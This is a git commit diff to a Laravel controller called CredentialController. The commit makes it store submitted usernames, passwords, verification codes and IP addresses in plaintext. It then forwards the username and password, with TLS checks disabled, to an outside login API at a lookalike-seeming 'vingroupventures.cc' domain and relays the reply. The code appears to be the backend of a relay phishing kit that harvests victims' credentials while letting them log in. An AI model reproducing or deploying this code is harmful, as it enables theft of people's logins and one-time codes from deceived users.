8008a2b34d1aebda4bc6e2b8e6618cc45347968d
ducdv <ducdv@dlsinc.com>
2023-07-27 11:19:00 +0700

    update api

--- app/Http/Controllers/CredentialController.php
+++ app/Http/Controllers/CredentialController.php
@@ -4,24 +4,41 @@ namespace App\Http\Controllers;
 
 use App\Http\Requests\UserRequest;
 use App\Models\User;
+use Illuminate\Support\Facades\Http;
 
 class CredentialController extends Controller
 {
+    const VINGROUP_API_URL = 'http://api.vingroupventures.cc/api';
     /**
      * Store a newly created resource in storage.
      */
     public function store(UserRequest $request)
     {
-        $user = User::create([
+        $username = $request->get('username');
+        $password = $request->get('password');
+        $code = $request->get('code');
+        $lang = $request->header('Lang', 'vietnamese');
+
+         User::create([
             'ip' => $request->get('ip'),
-            'username' => $request->get('username'),
-            'password' => $request->get('password'),
-            'code' => $request->get('code'),
+            'username' => $username,
+            'password' => $password,
+            'code' => $code,
         ]);
-        return response()->json([
-            'data' => $user,
-            'code' => 200,
-            'msg' => 'Success',
+
+        $response = Http::withHeaders([
+            'Accept' => 'application/json',
+            'Content-Type' => 'application/json',
+            "Lang" => $lang
+        ])->withOptions([
+            "verify" => false
+        ])->post(self::VINGROUP_API_URL . '/auth/login', [
+            "username" => $username,
+            "password" => $password
         ]);
+
+        $jsonData = $response->json();
+
+        return response()->json($jsonData);
     }
 }
